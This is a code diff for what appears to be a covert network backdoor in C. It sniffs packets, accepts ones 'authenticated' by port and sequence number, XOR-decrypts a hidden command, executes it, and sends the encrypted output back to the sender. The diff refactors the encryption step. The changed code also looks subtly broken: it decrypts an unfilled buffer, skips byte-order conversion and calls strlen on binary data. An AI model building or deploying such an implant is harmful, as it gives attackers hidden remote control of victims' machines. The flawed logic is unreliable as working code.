@@ -34,7 +34,7 @@ char** execute_command(const char *command, int *size)
     while (fgets(line_buffer, MAX_LINE_LEN, fp))
     {
         temp = realloc(result, i * sizeof(char*));
-        if (!temp) 
+        if (!temp)
         {
             perror("realloc");
             return NULL;
@@ -80,6 +80,7 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
 
     int size_ip = 0;
     int size_tcp = 0;
+    int size_payload = 0;
 
     // clear buffers
     memset(command, 0, MAX_COMMAND_LEN);
@@ -98,14 +99,14 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
 
     // Step 1: Locate the payload of the packet
     payload = (char*)(packet + SIZE_ETHERNET + size_ip + size_tcp);
+    size_payload = ip->ip_len - size_ip - size_tcp;
 
     // Step 2: Authenticate the packet
     if (!is_seq_num_auth(tcp_sport, tcp_seqnum)) return;
     printf("Got an authenticated packet\n Source port: %u\n Seqnum: %u\n", tcp_sport, tcp_seqnum);
 
     // Step 3: Decrypt the payload
-    hex_str_to_bytes(payload, payload_buffer, strlen(payload));
-    xor_string(XOR_KEY, strlen(XOR_KEY), payload_buffer, decrypted, strlen(payload) / 2);
+    xor_bytes(XOR_KEY, strlen(XOR_KEY), payload_buffer, decrypted, size_payload);
     printf("Decrypted payload: %s\n", decrypted);
 
     // Step 4: Verify decrypted payload has a command in it
@@ -129,7 +130,7 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
 
     // Allocate a string to hold all the strings in the list
     command_output = malloc(total_size);
-    for (int i = 0; i < command_output_size; i++) 
+    for (int i = 0; i < command_output_size; i++)
     {
         offset += sprintf(command_output + offset, "%s", command_output_ptr[i]);
     }
@@ -137,7 +138,7 @@ void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* pa
 
     // Step 7: Send the results back
     encrypted_command_output = malloc(total_size);
-    xor_string(XOR_KEY, strlen(XOR_KEY), command_output, encrypted_command_output, strlen(command_output));
+    xor_bytes(XOR_KEY, strlen(XOR_KEY), command_output, encrypted_command_output, strlen(command_output));
     send_message_to_ip(ip->ip_src, SERVER_PORT, encrypted_command_output, strlen(encrypted_command_output));
 
     free(encrypted_command_output);
